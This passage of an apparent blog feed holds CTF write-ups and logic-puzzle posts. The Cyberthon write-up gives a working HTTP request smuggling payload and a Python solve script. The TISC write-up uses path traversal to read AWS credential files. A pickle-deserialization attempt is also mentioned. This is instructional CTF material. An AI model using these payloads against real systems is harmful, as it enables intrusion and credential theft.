class="string">&quot;&quot;</span> &amp;&amp; testimonial != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		c, err := client.GetClient()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(w, err.Error(), http.StatusInternalServerError)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err := c.SendTestimonial(customer, testimonial); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(w, err.Error(), http.StatusInternalServerError)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> home.Index().Render(r.Context(), w)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We now need to reload the application and submit a new testimonial, thereby calling the malicious home handler. Looking at <code>air.toml</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include_ext = [&quot;tpl&quot;, &quot;tmpl&quot;, &quot;templ&quot;, &quot;html&quot;]</span><br></pre></td></tr></table></figure>

<p>All we need to do is create a new file with one of these extensions and we can retrieve the flag.</p>
<h2 id="SerialFlow"><a href="#SerialFlow" class="headerlink" title="SerialFlow"></a>SerialFlow</h2><p>I had no time to solve this one, but I took a quick look at the challenge. It uses a vulnerable version of <code>py-memcached</code> to store the session cookie, which uses unsafe pickle deserialization methods. I tried a few encoding methods to upload a simple payload during the last hour of the CTF, but none of them worked.</p>
<p>After the CTF, I read a few writeups and apparently octal works. Unfortunate.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine&#39;s Day 2025 Puzzle - Shot Through The Heart</title>
    <url>/2025/02/14/valentines-2025/</url>
    <content><![CDATA[<p><img src="/2025/02/14/valentines-2025/shot-through-the-heart.png" alt="grid"></p>
<p>Classic <a href="https://puzz.link/rules.html?shakashaka">Shakashaka rules</a> apply.<br>Red lines must lie on the edges of rectangles.</p>
<p>Solve the puzzle on <a href="https://swaroopg92.github.io/penpa-edit/#m=solve&p=tVVdb5swFH3Pr2B+2YtV8RUCvHX9WCd13dZmqyoUVU5CE1QSZwbWlqj97T2+RktImDapmhCX4+N7rw/Exyl+VkKlPOQD7oXc5g4uz3e5Z/vcDxy67eYaZmWextbVXJbWcK5kNZtb5Ty1zlKhSn5YlXOpYutTMRFKcH6Ui6LIJkgX96LQwVJVnhaWWK3ypwPrMp1aebYEsaiKEjC15JL6pdMZWHlnqXRSiuUMRQf8y+kpvxN5kfaSRs+olzCHcebidtjohU3kYpyxl4TRamDZqLeuL+N1fRsno2def9/AcAOv4jVzAxb7nPkePfq+eRgyGNAjNKMooodj6xxUX6BaZyRah55go2Z2i0GeE68RbyieUnQpDiGC1x7FY4o2xT7Fc8o5wRpOgB9nAH0hOvYjjvEGDxo8QE7oGhy63In6Bkd97tohYTy56zoGO/Zv7EQRx7ipDVGLF6WeAXqaWifwsBa+A2H0Dxo9GpM2iL0myUcUfYoBvcpAf+1eL3HRr3X1/+8Y2wTbgBUyvy0qdScmKYtpI3HiltVinKoWlUu50juzRWazpVRp55Qm9Z7tyB9LNd3p/iDyvEUYC7aoSaYmeZsqVcbiUlXNUCglH1oJC1HOW8RYlPBrMc9W7UbpsmyvX4q2QphHL7bde/PKzz32yOhOsBm4ry0WxfUhrz9ix2/5kdff4LHPcX2hLZYweIE2NCW5gCfGISHgNc1r8sjMOzbwhcG67AbQfJTbc8yC+Ron9VBbnNcfqFpDtpC/INTo0GNzJIDY+hhmpqim8r5qch3t0EOS25R0aPYazQ00mjXq0Kxf5c2aN8fYjtxo9Gx+BvsfzzdzTr39FPqrvR8bp0nVaTbQHX4D2+mrht+zFvg9E+kF930EtsNKYMlNbWrfUSD3TAXuD77SXXetpVXtuksvtWcwvdS2x3BkneF/8sn6IXI0xdT7wjoWT+9eAQ==&a=VY9LDgQhCAXv4pqFIh/dzjU63v8aPdNULyYxgeKFUq/ryN9po3fRT5NvM2RWo+9k1kS3jF+dXeypCk+Y3MhtlMC09s1gL3ZyJw98gS8MdnjBuzjxJb4MOGHes/jRYn+xv3vxfu4/5wY=">Penpa</a>. Happy Valentine‚Äôs Day!</p>
]]></content>
      <categories>
        <category>Puzzles</category>
      </categories>
      <tags>
        <tag>Shakashaka</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyberthon 2024 - The Galaxy&#39;s Best Smuggler</title>
    <url>/2024/05/04/cyberthon-2024/</url>
    <content><![CDATA[<p>Cyberthon is an annual CTF competition targeted towards JC students in Singapore. This year, I had the opportunity to author a challenge for the web category: The Galaxy‚Äôs Best Smuggler.</p>
<p>At the end of this writeup are my thoughts on challenge creation.</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote>
<p>üìò Challenge description:</p>
<p>‚ÄúEver heard of sabacc?‚Äù</p>
<p>‚ÄúI‚Äôve played it a couple times.‚Äù</p>
<p>You eye the stifling pile of credit on Lando‚Äôs side of the table, allowing yourself a wry smile.</p>
<p>‚ÄúHaving a good day, I reckon.‚Äù</p>
<p>‚ÄúOh, you ain‚Äôt seen nothing yet, Han. I bet my ship I win this next game.‚Äù</p>
<p>You spy a faint glimmer in his eyes typical of all smugglers, one of trickery and deceit.</p>
<p>‚ÄúNot playing fair, I suppose. Well, two can play at that game. After all‚Ä¶‚Äù</p>
<p>‚ÄúThey don‚Äôt call me the galaxy‚Äôs best SMUGGLER for nothing.‚Äù </p>
</blockquote>
<p><a href="https://github.com/Iscaraca/CTF-Challenges/tree/main/cyberthon2024/the_galaxys_best_smuggler">Link to source code</a></p>
<p>In this challenge, you play against a bot in a modified version of blackjack, where the sweet spot is 20. Your opponent has rigged the cards such that they‚Äôll always draw 20 at the start every time, while you‚Äôll draw a measly 2. To get the flag, you‚Äôll have to win the game.</p>
<p><img src="/2024/05/04/cyberthon-2024/sabacc.png" alt="Sabacc game page"></p>
<p>The rules of the game are simple.</p>
<ul>
<li><p>Your opponent will make the first move.</p>
</li>
<li><p>At every turn, you can make one of 3 moves:</p>
<ul>
<li>Hit: Draw a new card from the deck, and add it to your hand.</li>
<li>Stand: End your turn without taking a card.</li>
<li>Reveal: Place your hand on the table face up, and force your opponent to do the same. The winner will be judged. You cannot do this on the move that opens the game.</li>
</ul>
</li>
</ul>
<p>While the entire solve path was clued via hints given in the provided markdown file during the challenge, I‚Äôll go through the challenge as if there was no help given.</p>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Crafting-a-plan"><a href="#Crafting-a-plan" class="headerlink" title="Crafting a plan"></a>Crafting a plan</h3><p>Source code for this challenge is provided in full, along with deployment steps. Let‚Äôs first look at the conditions required to win a game.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check for winning hand</span></span><br><span class="line"><span class="keyword">if</span> (player_1_total == <span class="number">20</span> <span class="keyword">and</span> player_2_total == <span class="number">20</span>):</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total == <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total == <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for overflowed hands</span></span><br><span class="line"><span class="keyword">elif</span> (player_1_total &gt; <span class="number">20</span> <span class="keyword">and</span> player_2_total &gt; <span class="number">20</span>):</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total &gt; <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total &gt; <span class="number">20</span>:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for larger hand</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total == player_2_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Draw&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_1_total &gt; player_2_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 1&quot;</span></span><br><span class="line"><span class="keyword">elif</span> player_2_total &gt; player_1_total:</span><br><span class="line">    <span class="variable language_">self</span>.winner = <span class="string">&quot;Player 2&quot;</span></span><br></pre></td></tr></table></figure>


<p>The bot will always join as player 1, so its hand will be evaluated first. We have no opportunity to win using our hand alone, so we‚Äôll need to somehow sabotage our opponent‚Äôs hand to win. If we could force the bot to draw another card instead of revealing its hand, we‚Äôd overflow its hand and win by default. Is there a way to do just that?</p>
<p>This challenge is an introduction to <strong>HTTP request smuggling</strong>, as clued by the title and the description. This is a technique to interfere with the way servers process HTTP requests coming from more than one source. Before we get into specifics, it would be useful to read up on an <a href="https://portswigger.net/web-security/request-smuggling">overview of how the attack works</a>.</p>
<p>We‚Äôll be using this technique to tamper with the bot‚Äôs HTTP request to <code>/reveal</code>, and change it to <code>/hit</code> instead.</p>
<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>We‚Äôll need to craft a HTTP request that can be parsed using the <code>Content-Length</code> header on either the proxy or the game server, and <code>Transfer-Encoding</code> on the other. However, both HAProxy (the proxy) and Gunicorn (the backend web server) ignore the <code>Content-Length</code> header when both of them are present, as per the HTTP&#x2F;1 specification.</p>
<p>Either by looking for vulnerabilities related to HAProxy or noticing that the specific version of HAProxy used in the docker environment is outdated, we can find a <a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">well-documented vulnerability</a> detailing a way to malform the <code>Transfer-Encoding</code> header such that HAProxy fails to detect it, while Gunicorn does. The key is to simply insert a <code>\x0b</code> character into the <code>Transfer-Encoding</code> header.</p>
<p>With this knowledge, we can craft a HTTP request to tamper with the bot‚Äôs.</p>
<h3 id="How-the-HTTP-Protocol-Works"><a href="#How-the-HTTP-Protocol-Works" class="headerlink" title="How the HTTP Protocol Works"></a>How the HTTP Protocol Works</h3><p>Before we get to our payload, let‚Äôs first go through how web applications send and receive data.</p>
<p>Almost all HTTP communication is done over TCP&#x2F;IP, which you can think of as a reliable pipe that streams bytes of data from one end to another. Bytes that go in one end of the pipe come out of the other correctly, and in the same order they went in. When HTTP messages are transmitted over this pipe in a single stream of bytes, how does the web application receiving this data know when each request starts and stops?</p>
<p>First, the application will read the stream of bytes until it receives two CRLF sequences, <code>\r\n\r\n</code>. This will be the end of our HTTP header. Notice how in the example request below, the header and body are delimited with a double CRLF.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure>


<p>However, the body does not have a fixed delimiter indicating its end. Instead, the length of the body can be determined from the header, either via <code>Content-Length</code> or <code>Transfer-Encoding: chunked</code>. How the second method works can be found <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding">here</a>. Once the length of the body is determined, the application will then read that number of bytes from the pipe, successfully reading one full HTTP request.</p>
<p>While the application is parsing the header, where is the HTTP body stored? All data that has not been procedded by the application yet is stored in a buffer called the TCP Receive Window, until the application chooses to read more data from the pipe. Remember that data being read from the pipe must be in the same order it went in.</p>
<h3 id="Constructing-our-Payload"><a href="#Constructing-our-Payload" class="headerlink" title="Constructing our Payload"></a>Constructing our Payload</h3><p>I will be using <a href="https://github.com/siemens/edgeshark">edgeshark</a> to capture network traffic from within the docker environment, which will allow us to view the transfer of HTTP packets using Wireshark. This is not a necessary step, but it‚Äôs useful for a writeup&#x2F;tutorial such as this one.</p>
<p>In this section, it is important that <strong>all requests are sent to the proxy directly</strong>. Sending these requests to your client will do nothing as the bot‚Äôs requests do not pass through the client.</p>
<p>We‚Äôll be monitoring HAProxy‚Äôs ethernet interface for this section. On round 3, the bot will send a GET request to the <code>/reveal</code> endpoint with its cookie.</p>
<p><img src="/2024/05/04/cyberthon-2024/reveal.png" alt="Reveal request"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /reveal HTTP/1.1</span><br><span class="line">Host: proxy:1080</span><br><span class="line">User-Agent: python-requests/2.31.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Now that we know the bot‚Äôs HTTP request, let‚Äôs break down the attack. Consider this payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /game-state HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding:[\x0b]chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:</span><br></pre></td></tr></table></figure>


<p>When we send this to HAProxy, it ignores the <code>Transfer-Encoding</code> header and uses the value provided by <code>Content-Length</code> to parse the request. This makes the proxy interpret the request as is, up to <code>X-Foo:</code>. However, the proxy forwards this request as a stream of bytes to the backend server, which correctly indentifies <code>Transfer-Encoding</code> and reads the stream as such:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /game-state HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Transfer-Encoding:[\x0b]chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>


<p>This leaves the remainder of the request,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:</span><br></pre></td></tr></table></figure>

<p>still in the TCP Receive Window of the game server. What happens if the bot sends its request now? What would the stream of data look like in the TCP pipe?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /hit HTTP/1.1</span><br><span class="line">X-Foo:GET /reveal HTTP/1.1</span><br><span class="line">Host: proxy:1080</span><br><span class="line">User-Agent: python-requests/2.31.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>When the server is ready to process its next request, it reads the above as one full HTTP request, a GET request to <code>/hit</code> from the bot‚Äôs player ID. We‚Äôve successfully tampered with the bot‚Äôs request!</p>
<h3 id="One-Possible-Pitfall"><a href="#One-Possible-Pitfall" class="headerlink" title="One Possible Pitfall"></a>One Possible Pitfall</h3><p>Just sending this payload once will not work. Looking at the edgeshark capture, we can see that our TCP stream is closing right after we send our payload, and the GET request to <code>/reveal</code> doesn‚Äôt use the same stream. </p>
<p><img src="/2024/05/04/cyberthon-2024/stream.png" alt="Stream capture"></p>
<p>The issue is that Gunicorn spawns multiple threads per worker, so smuggling one of them won‚Äôt be enough. The simple workaround here is to send our payload to the proxy many times to ensure that all the TCP streams get polluted with our payload.</p>
<h3 id="Final-Solution"><a href="#Final-Solution" class="headerlink" title="Final Solution"></a>Final Solution</h3><p>All we have to do is wait until its our move, either hit or stand, and run our solve script right before the bot sends in the request to reveal.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># The proxy port is 4941</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:&lt;insert-malbyte-here&gt;chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((<span class="string">&quot;sabacc.chals.f.cyberthon24.ctf.sg&quot;</span>, <span class="number">4941</span>))</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">response = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(response.decode())</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\user\sol&gt; python .\solution.py</span><br><span class="line">HTTP/1.1 406 NOT ACCEPTABLE</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Sat, 04 May 2024 12:06:26 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;:&quot;Player ID not set&quot;&#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2024/05/04/cyberthon-2024/forced.png" alt="Forced draw"></p>
<p>And all we have to do now is reveal.</p>
<p><img src="/2024/05/04/cyberthon-2024/win.png" alt="Win"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cyberthon&#123;the_falcon_is_all_mine!&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>When I was given the theme for this year‚Äôs Cyberthon (Star Wars), the idea to somehow incorporate request smuggling as a thematic connection to the smugglers and gunrunners of the SW universe came to me pretty quickly. The whole card game idea came from the lore, and I think I did a pretty good job on that part.</p>
<p>Halfway through making the challenge, I realised that the vulnerability worked against me, as teams could very easily sabotage others by smuggling their requests to the server as well. I had to come up with a solution for this, which was my standalone CTF challenge instancer you can find <a href="https://github.com/Iscaraca/CTFInstancer">here</a>.</p>
<p>I really wanted to make this a good learning experience, which was why I put almost the entire solution path in a downloadable markdown file as hints. It was a bit challenging to balance exploration with supervision in a way that made the challenge rewarding, but this challenge wasn‚Äôt supposed to be that hard anyway. The CTF was 8 hours, after all.</p>
<p>I think this challenge seemed way too daunting to most participants, despite being (in my opinion) the easiest challenge out of the three harder web challenges. Perhaps I should‚Äôve left out the fact that this challenge was difficult in the markdown file to harmlessly mislead them.</p>
<p>Thank you to Alt-Tab Labs and CSIT for this opportunity, and to Kane from NUSH for solving my challenge. You can claim caifan from me anytime.</p>
]]></content>
      <categories>
        <category>CTF Writeups</category>
      </categories>
      <tags>
        <tag>Challenge Creation</tag>
      </tags>
  </entry>
  <entry>
    <title>Yajilin 1 - Crossing The River</title>
    <url>/2025/02/21/yajilin-1/</url>
    <content><![CDATA[<p><img src="/2025/02/21/yajilin-1/yajilin-1.png" alt="grid"></p>
<p>Classic <a href="https://puzz.link/rules.html?yajilin">Yajilin rules</a> apply.</p>
<p>Solve the puzzle on <a href="https://puzsq.logicpuzzle.app/puzzle/157510">PuzzleSquare</a> or <a href="https://puzz.link/p?yajilin/8/10/e10d20j1010c40j10d20e30d30d20j10d20e">puzzlink</a>.</p>
]]></content>
      <categories>
        <category>Puzzles</category>
      </categories>
      <tags>
        <tag>Yajilin</tag>
      </tags>
  </entry>
  <entry>
    <title>TISC 2023 - Blind SQL Injection</title>
    <url>/2023/10/21/tisc-2023/</url>
    <content><![CDATA[<p>TISC is a two-week online sequential style CTF competition hosted by CSIT, where participants solve a series of 10 challenges. Over 1000 participants took on the challenges, with the top three levels of challenges having a cash prize pool of $10,000 each to be shared between participants who successfully cleared the respective levels.</p>
<p>I was given the opportunity to create the challenge at level 8, and I‚Äôll be sharing the writeup as well as a few of my thoughts at the end of the blog post.</p>
<p>Congrats to the 18 people that managed to solve my challenge and get a slice of the $10,000 prize! I‚Äôm not jealous, I swear :sob:</p>
<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote>
<p>üìò Challenge description:</p>
<p>‚ÄúWe found this horribly made website on their web servers,‚Äù your superior tells you. ‚ÄúIt‚Äôs probably just a trivial SQL injection vulnerability to extract the admin password. I‚Äôm expecting this to be done in about an hour.‚Äù</p>
</blockquote>
<p><a href="https://github.com/Iscaraca/CTF-Challenges/tree/main/tisc2023/blind_sql_injection">Link to source code (including solution scripts, c code before compiling, and how to set up the lambda function)</a><br>Attached files: Dockerfile server.js db-init.sql</p>
<p>The website we‚Äôre brought to is a really shitty reminder site where you log in with an account, type in what you want to be reminded of, and then get that string shown to you in a few different colour themes.</p>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> Users (</span><br><span class="line">  id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">  username <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">  password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT INTO</span> Users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;flag&#123;example&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> Users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;bobby&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>The flag is the password of the admin user. After testing the login form, we can surmise that the username and password fields of the login page only allow alphabetical inputs only. Any numerical characters or symbols are blacklisted by a lambda function.</p>
<p>In server.js, these comments in the <code>/api/login</code> route are probably the culprit:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pk&gt; Note: added URL decoding so people can use a wider range of characters for their username :)</span></span><br><span class="line"><span class="comment">// dr&gt; Are you crazy? This is dangerous. I&#x27;ve added a blacklist to the lambda function to prevent any possible attacks.</span></span><br></pre></td></tr></table></figure>

<p>The login form passes the username and password through an AWS lambda function to check for non-alphabet characters, and return an SQL query if none are present.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">lambda.<span class="title function_">invoke</span>(&#123;</span><br><span class="line">    <span class="title class_">FunctionName</span>: <span class="string">&#x27;craft_query&#x27;</span>,</span><br><span class="line">    <span class="title class_">Payload</span>: payload</span><br><span class="line">&#125;, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        req.<span class="title function_">flash</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Uh oh. Something went wrong.&#x27;</span>);</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">save</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> responsePayload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data.<span class="property">Payload</span>);</span><br><span class="line">        <span class="keyword">const</span> result = responsePayload;</span><br><span class="line">        <span class="keyword">if</span> (result !== <span class="string">&quot;Blacklisted!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> sql = result;</span><br><span class="line">            db.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, results</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    req.<span class="title function_">flash</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Uh oh. Something went wrong.&#x27;</span>);</span><br><span class="line">                    req.<span class="property">session</span>.<span class="title function_">save</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (results.<span class="property">length</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    res.<span class="title function_">redirect</span>(<span class="string">`/reminder?username=<span class="subst">$&#123;username&#125;</span>`</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    req.<span class="title function_">flash</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Invalid username/password&#x27;</span>);</span><br><span class="line">                    req.<span class="property">session</span>.<span class="title function_">save</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            req.<span class="title function_">flash</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Blacklisted&#x27;</span>);</span><br><span class="line">            req.<span class="property">session</span>.<span class="title function_">save</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Blind SQL injection is pretty much impossible without these blacklisted characters, so it suffices that another attack vector is present on the site.</p>
<h3 id="Part-1-LFI-to-leak-AWS-credentials"><a href="#Part-1-LFI-to-leak-AWS-credentials" class="headerlink" title="Part 1: LFI to leak AWS credentials"></a>Part 1: LFI to leak AWS credentials</h3><p>After logging in with bobby‚Äôs credentials, the user is brought to a page with a form to create a reminder. The form includes a text input for a reminder, the name of the user, and the view type of the reminder. The viewType parameter is unsanitized and can be used to load any file.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit-reminder&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">const</span> reminder = req.<span class="property">body</span>.<span class="property">reminder</span>;</span><br><span class="line">    <span class="keyword">const</span> viewType = req.<span class="property">body</span>.<span class="property">viewType</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(pug.<span class="title function_">renderFile</span>(viewType, &#123; username, reminder &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Looking at the provided Dockerfile, we can see <code>COPY .aws/ /root/.aws/</code>, which seems ripe for the taking. Simply replacing the viewType parameter with <code>../../../../../../../../root/.aws/credentials</code> and <code>../../../../../../../../root/.aws/config</code> will raise errors like these:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>Error: ../../../../../../../../root/.aws/credentials:1:1 <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span> 1| [default]-------^ <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>2| aws_access_key_id = SOME_KEY_HERE <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>3| aws_secret_access_key = SOME_OTHER_KEY_HEREunexpected text <span class="symbol">&amp;quot;</span>[defa<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at makeError (/app/node_modules/pug-error/index.js:34:13) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Lexer.error (/app/node_modules/pug-lexer/index.js:62:15) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Lexer.fail (/app/node_modules/pug-lexer/index.js:1629:10) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Lexer.advance (/app/node_modules/pug-lexer/index.js:1694:12) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Lexer.callLexerFunction (/app/node_modules/pug-lexer/index.js:1647:23) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at Lexer.getTokens (/app/node_modules/pug-lexer/index.js:1706:12) <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>at lex 